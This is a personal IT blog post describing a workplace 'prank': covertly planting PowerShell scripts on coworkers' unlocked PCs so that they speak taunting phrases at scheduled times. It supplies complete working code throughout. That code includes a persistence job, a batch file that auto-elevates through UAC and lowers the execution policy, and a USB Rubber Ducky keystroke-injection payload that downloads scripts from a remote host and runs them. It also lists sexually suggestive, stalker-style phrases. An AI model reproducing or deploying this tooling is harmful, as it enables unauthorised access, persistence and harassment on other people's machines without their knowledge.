---
categories:
- microsoft
- Out of Band
date: 2013-10-10
excerpt: In every IT office I have worked in, pulling pranks co-workers has been a
  standard. They tend to be low-tech; co-workers leave their computers unlocked, change
  their background, and maybe change...
tags:
- indyposh
- microsoft
- powershell
- scripting
- skydrive
- thekrewe
- windows
- windows-8
- work-in-it
title: PowerShell Pranks - Making Work Fun with Creepy Voices!
---

In every IT office I have worked in, pulling pranks co-workers has been a standard. They tend to be low-tech; co-workers leave their computers unlocked, change their background, and maybe change their Windows sound effects. They tend to be small and easy to revert.

We had an intern program over the summer in our office and a specific intern who wasn't very wise when it came to locking his computer. We got him probably 10-15 times with a picture of [David Hasselhoff in a thong](http://quotabledouchebag.files.wordpress.com/2010/02/749134-david_hasselhoff_super.jpg). We also installed some fun Google Chrome add-ons that would change every image on the page to something else.

These got boring, which is very unusual when making someone have a sexy background. However, because we became so bored with it, we decided to take it a step further. We thought, wouldn't it be cool to automate this with PowerShell? So our initial idea was changing the background to a random image. Looking through the ways of doing that was semi-complicated, and I was feeling lazy. So we ditched the idea, and it was on the back burner for a long time.

![]({{ site.baseurl }}/assets/img/p0d3l.jpg)

One evening I came home from work and stumbled upon this fantastic post on the PowerShell Sub-Reddit "[A fun script for Friday - make your friend's computer start talking to him/her](http://www.reddit.com/r/PowerShell/comments/1khn9o/a_fun_script_for_friday_make_your_friends/)." To sum it up, it'll use Text to Speech to have the computer talk. In the example posted, it used PowerShell Remoting. Using PowerShell Remoting for such a malicious intent may cross a line, depends on who the target is and how much you abuse it. In my case, the computers were not domain joined, and so I couldn't use that as easily. So I decided to take my Friday night and make it quite a bit more "portable."

<!--more-->

## Step 1: Writing the Script

Now writing the script was going to be easy. It was almost already written for me a few tweaks here and there and boom done. The first iteration of this script read from a file I copied to the system when initially deploying it. I decided that wasn't nearly as much fun as controlling it remotely. So the current version, when executed, downloads the newest phrase file from a web service and save to buried directory on the file system. Knowing the majority of my targets were male, and the phrases I'd be using would have extra effect coming from a male voice, I decided to add a Voice Hint of Male.

```
<# File: voice.ps1 
    By: Matt Griffin 
    Website: MattBlogsIT.com 
    Purpose: This is the main payload for the Text-To-Speech prank, it executes the Speech Synthesizer from a document containing phrases. 
    Version: 1.1 
#> 
[Reflection.Assembly]::LoadWithPartialName('System.Speech') | Out-Null 
Invoke-WebRequest -uri "http://mattblogsit.com/prankphrases.txt" -OutFile $HOME\bin\prankphrases.txt 
$phrases = Get-Content $HOME\bin\prankphrases.txt 
$phrase = Get-Random $phrases 
$object = New-Object System.Speech.Synthesis.SpeechSynthesizer 
$object.SelectVoiceByHints('Male') 
$object.Speak($phrase)
```

So we have the voice script written, but we need the phrases! So I spent a fair amount of time on these and probed a couple of my friends to help pitch in for this effort, and I am quite happy with the list we have. All you need to do is toss these onto a web server (OneDrive works great too!), make sure it is publicly accessible, and move to the next step. **Please read over it, some of them may cause a sexual harassment concern with HR.**

"I can see you type.",  
"Sometimes I sneak into your house and stay in your closet and watch you.",  
"I collect strands of your hair which I am attaching to a doll that I have named after you, and at night, I hug it in my sleep.",  
"I love it when you smash my key's",  
"When I am in the shower, I close my eyes and pretend that I am washing your body instead of mine.",  
"Every time I eat something sweet, I imagine that it is what you would taste like.",  
"Every day when you're not looking, I take a piece of your hair and add it to my collection.",  
"I love your skin; it's so soft.",  
"Touch me again.",  
"Let me rub your feet.",  
"I like the color of your underwear.",  
"I put the STD in STUD",  
"All I need is you.",  
"You remind me of Poke-e-mon. I wanna peek-at-chu. I also want to keep you in a giant plastic ball.",  
"Don't leave me again… please.",  
"I love to watch you leave, but hate it too.",  
"I love the way you stare at my screen.",  
"When I look into your eyes, my CPU overheats.",  
"I become dyslexic with 1's and 0's when you are here.",  
"No, I will not make out with you!",  
"I like big butts, and I cannot lie.",  
"It seems right now that all I've ever done in my life is making my way here to you.",  
"You see I never stopped loving you, even though I couldn't see you.",  
"Maybe it is our imperfections which make us so perfect for one another.",  
"You may not be a smart man, but you know what love is.",  
"I love you. You… you complete me.",  
"I'm very discreet, but… I will haunt your dreams.",  
"What we have here is a failure to communicate.",  
"You turn me on every day.",  
"Without you I am meaningless.",  
"You give me the power to live another day.",  
"Call me Mr. Nibbs.",  
"I'd love to kiss your wooky."

Now that the majority of the script was written, I needed a way for it to repeat. I was aware of PowerShell Jobs, but I had never set one up and wasn't 100% sure on how to do it. Setting up the job was probably the most time consuming aside from writing the phrases. I had quite a bit of learning, but I was able to throw together what to the target would seem to be random, but to me, I know the exact time it executes, and I can make sure I am around the area when it runs.

```
<#  File: prankschedule.ps1
    By: Matt Griffin
    Website: MattBlogsIT.com
    Purpose: This file sets up the PowerShell jobs that execute the main payload.
    Version: 1.1
#>
$dir = "$HOME\bin"
$times = '08:44am','09:41am','10:31am','11:17am','12:24pm','01:23pm','02:53pm','03:57pm','04:08pm','05:4pm','06:56pm','08:31pm','10:39pm'
$days = 'Monday','Tuesday','Wednesday','Thursday','Friday'
$trig = @()
foreach($time in $times){
    $trig += New-JobTrigger -Weekly -At $time -DaysofWeek $days
}
Register-ScheduledJob -Name 'VoicePrank' -Trigger $trig -FilePath $dir\voice.ps1
```

## Step 2: Implementing the Script

So I had a solid script written now I was down to how it would be delivered. I stated above I wasn't going to use PowerShell Remoting. So it was going to need to be easy to deliver, I could plop it onto our network somewhere and copy it down, but that requires manual labor; so back to the whole lazy thing I figured a Flash Drive would be best. Copying the files manually and executing the scripts also affects that lazy thing, so I figured I had a few things to accomplish that I don't want to do manually.

1. Change Execution Policy
2. Copy Files to local system
3. Execute the prankschedule.ps1 file

Those are simple enough, right? Let's just write a quick PowerShell script to copy our files and run the schedule script.

```
<#  File: prankInstall.ps1
    By: Matt Griffin
    Website: MattBlogsIT.com
    Purpose: This file installs the Text to Speech Prank Script
    Version: 1.1
#>
$scriptPath = $MyInvocation.MyCommand.Path
$dir = Split-Path $scriptPath
New-Item $HOME\bin -Type Directory
Set-Location $HOME\bin
Copy-Item -Path $dir\voice\* -Destination .
.\prankSchedule.ps1
```

Well, great, we have our files copied, but I still have to open PowerShell and change the Execution Policy. We can write a batch file to fix that! The thing I ran into is I was so lazy I didn't want to right-click, so UAC is going to be an issue. Luckily with some quick Google... I mean, Binging! I was able to find [a fantastic answer on StackOverflow](http://stackoverflow.com/questions/7044985/how-can-i-auto-elevate-my-batch-file-so-that-it-requests-from-uac-admin-rights). Once UAC was bypassed, it was a simple call Powershell.exe and passed an argument that runs a cmdlet. Please note that I am also doing some fancy stuff with the directory the file is executing from, I have no idea where I found that, but it was some easy searching that found that too.

```
REM	File: prankInstall.bat
REM	By: Matt Griffin
REM	Website: MattBlogsIT.com
REM	Purpose: Launches cmd.exe, pulls up UAC prompt, executes PowerShell prankInstall.ps1 file.
REM	Version: 1.1

@echo off
:::::::::::::::::::::::::::::::::::::::::
:: Automatically check & get admin rights
:::::::::::::::::::::::::::::::::::::::::
CLS 
ECHO.
ECHO =============================
ECHO Running Admin shell
ECHO =============================

:checkPrivileges 
NET FILE 1>NUL 2>NUL
if '%errorlevel%' == '0' ( goto gotPrivileges ) else ( goto getPrivileges ) 

:getPrivileges 
if '%1'=='ELEV' (shift & goto gotPrivileges)  
ECHO. 
ECHO **************************************
ECHO Invoking UAC for Privilege Escalation 
ECHO **************************************

setlocal DisableDelayedExpansion
set "batchPath=%~0"
setlocal EnableDelayedExpansion
ECHO Set UAC = CreateObject^("Shell.Application"^) > "%temp%\OEgetPrivileges.vbs" 
ECHO UAC.ShellExecute "!batchPath!", "ELEV", "", "runas", 1 >> "%temp%\OEgetPrivileges.vbs" 
"%temp%\OEgetPrivileges.vbs" 
exit /B 

@echo off
:gotPrivileges 
::::::::::::::::::::::::::::
:START
::::::::::::::::::::::::::::
setlocal & pushd .
powershell.exe Set-ExecutionPolicy RemoteSigned
pushd "%~dp0"
powershell.exe ./prankInstall.ps1
popd
```

## (Bonus) Step 4: Going Further with Automation

I had this script written and running on the primary target and a few extra systems. It worked great. I then attended [DerbyCon](http://www.derbycon.com/), which is a security conference in Louisville, KY. While there, I decided to obtain a device called a USB Rubber Ducky, I had heard of this device before; but at the time, I didn't have a use for it... until now.

What this device does is emulate a keyboard and is used as a keystroke injection device. With a bit of automation, I was able to skip that whole opening a directory, publish some scripts to a web service, customize a payload to download it, and let it run. I have tested this on one system thus far, it runs flawlessly and without me touching the mouse or keyboard executes in about 10 seconds. I yank the device out and go about my business.

## [Buy your very own USB Rubber Ducky!](http://hakshop.myshopify.com/products/usb-rubber-ducky)

```
DELAY 1000
ESCAPE
DELAY 200
CONTROL ESCAPE
DELAY 200
STRING powershell.exe
DELAY 400
MENU
DELAY 300
RIGHTARROW
DELAY 100
RIGHTARROW
DELAY 100
RIGHTARROW
DELAY 100
ENTER
DELAY 600
ALT Y
DELAY 300
STRING Set-ExecutionPolicy RemoteSigned
Delay 100
STRING New-Item $HOME\bin -Type Directory 
ENTER
DELAY 100
STRING Invoke-WebRequest -uri "http://mattblogsit.com/psvoice/voice.txt" -OutFile "$HOME\bin\voice.ps1"
ENTER
DELAY 100
STRING Invoke-WebRequest -uri "http://mattblogsit.com/psvoice/prankSchedule.txt" -OutFile "$HOME\bin\prankSchedule.ps1" 
ENTER
DELAY 100
STRING powershell $HOME\bin\prankSchedule.ps1
ENTER
DELAY 100
STRING exit
ENTER
```

## Wrapping it up

It was quite a simplistic approach, I'll toss voice.ps1 and prankSchedule.ps1 in a directory called voice on the Flash Drive, then I'll put the prankInstall.ps1 and prankInstall.bat file in the root of the Flash Drive. Next time the computer is left unlocked, I will toss the drive into an open USB port, I'll view the directory in Explorer and double click the batch file. Click Yes on the UAC prompt, and it does the rest from there.

**Please note: No interns harmed in the development or testing of this script... he was full time by the time I wrote it and deployed it. It wasn't all my doing. It was a team effort to distract him when he went into the break room.**